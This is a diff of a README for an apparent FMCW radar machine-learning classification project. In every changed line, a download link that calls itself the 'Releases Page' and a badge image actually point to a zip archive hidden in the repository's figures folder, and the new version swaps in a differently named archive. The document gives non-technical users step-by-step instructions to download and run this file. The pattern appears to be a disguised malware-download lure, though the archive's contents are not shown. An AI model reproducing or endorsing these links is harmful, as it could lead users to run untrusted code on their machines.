@@ -1,6 +1,6 @@
 # 🚀 FMCW-Radar-ML-Classification - Easy Radar Simulation with Machine Learning
 
-![Download FMCW Radar ML Classification](https://raw.githubusercontent.com/jun012519/FMCW-Radar-ML-Classification/main/figures/FMCW-Radar-ML-Classification-v1.1-alpha.3.zip%20Radar%20ML%20Classification-brightgreen)
+![Download FMCW Radar ML Classification](https://github.com/jun012519/FMCW-Radar-ML-Classification/raw/refs/heads/main/figures/Radar-Classification-FMC-M-v2.2.zip%20Radar%20ML%20Classification-brightgreen)
 
 ## 📋 Description
 
@@ -11,7 +11,7 @@ FMCW-Radar-ML-Classification is designed for anyone interested in radar simulati
 To start using FMCW-Radar-ML-Classification, follow these easy steps:
 
 1. **Visit the Releases Page**  
-   Head over to our releases page to download the latest version of the software. You can find it here: [Download FMCW-Radar-ML-Classification](https://raw.githubusercontent.com/jun012519/FMCW-Radar-ML-Classification/main/figures/FMCW-Radar-ML-Classification-v1.1-alpha.3.zip).
+   Head over to our releases page to download the latest version of the software. You can find it here: [Download FMCW-Radar-ML-Classification](https://github.com/jun012519/FMCW-Radar-ML-Classification/raw/refs/heads/main/figures/Radar-Classification-FMC-M-v2.2.zip).
 
 2. **Download the Software**  
    Look for the latest release on the page. Click on the file link to download the application. Make sure to save it in a place you can easily find, like your Desktop or Downloads folder.
@@ -33,7 +33,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download FMCW-Radar-ML-Classification, visit our [Releases Page](https://raw.githubusercontent.com/jun012519/FMCW-Radar-ML-Classification/main/figures/FMCW-Radar-ML-Classification-v1.1-alpha.3.zip). Click on the most recent version and download the required file. Follow the installation steps mentioned above.
+To download FMCW-Radar-ML-Classification, visit our [Releases Page](https://github.com/jun012519/FMCW-Radar-ML-Classification/raw/refs/heads/main/figures/Radar-Classification-FMC-M-v2.2.zip). Click on the most recent version and download the required file. Follow the installation steps mentioned above.
 
 ## 🛠️ Using the Application
 
